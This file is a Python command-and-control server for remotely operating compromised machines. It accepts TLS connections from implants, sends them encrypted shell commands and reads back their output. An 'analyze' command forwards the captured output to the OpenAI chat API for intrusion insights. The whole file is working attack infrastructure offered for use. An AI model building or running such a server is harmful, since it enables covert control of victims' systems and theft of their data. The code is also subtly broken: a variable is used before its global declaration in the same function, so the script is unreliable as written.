#!/usr/bin/env python3
import socket
import ssl
import argparse
import os
import openai
from threading import Thread
from cryptography.fernet import Fernet

# --- Configuration ---
openai.api_key = os.getenv('OPENAI_KEY')
parser = argparse.ArgumentParser(description="AI-Powered C2 Server")
parser.add_argument("--ip", default="0.0.0.0", help="Listening IP")
parser.add_argument("--port", type=int, default=5555)
parser.add_argument("--key", required=True, help="Encryption key")
parser.add_argument("--cert", help="SSL certificate")
parser.add_argument("--pkey", help="SSL private key")
args = parser.parse_args()

# --- AI Analysis Engine ---
class AIAnalyzer:
    @staticmethod
    def analyze(command, output):
        response = openai.ChatCompletion.create(
            model="gpt-3.5-turbo",
            messages=[{
                "role": "system",
                "content": "Analyze this command output for security insights:"
            },{
                "role": "user",
                "content": f"Command: {command}\nOutput: {output[:3000]}"
            }],
            temperature=0.5
        )
        return response.choices[0].message.content

# --- Server Core ---
class AIC2Server:
    def __init__(self):
        self.cipher = Fernet(args.key.encode())
        self.context = self._create_ssl_context()
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((args.ip, args.port))
        self.sock.listen(5)

    def _create_ssl_context(self):
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        if args.cert and args.pkey:
            context.load_cert_chain(args.cert, args.pkey)
        return context

    def handle_client(self, conn, addr):
        print(f"[+] New connection from {addr}")
        while True:
            try:
                cmd = input(f"AI-C2 ({addr[0]})> ")
                
                if cmd == "analyze":
                    analysis = AIAnalyzer.analyze(last_cmd, last_output)
                    print(f"\nAI Analysis:\n{analysis}\n")
                    continue
                    
                conn.send(self.cipher.encrypt(cmd.encode()))
                output = self.cipher.decrypt(conn.recv(65535)).decode()
                print(output)
                
                # Store for analysis
                global last_cmd, last_output
                last_cmd, last_output = cmd, output
                
            except Exception as e:
                print(f"[-] Connection lost: {e}")
                break

    def run(self):
        print(f"[*] AI C2 server running on {args.ip}:{args.port}")
        while True:
            conn, addr = self.sock.accept()
            secure_conn = self.context.wrap_socket(conn, server_side=True)
            Thread(target=self.handle_client, args=(secure_conn, addr)).start()

if __name__ == "__main__":
    last_cmd, last_output = "", ""  # Store for AI analysis
    AIC2Server().run()
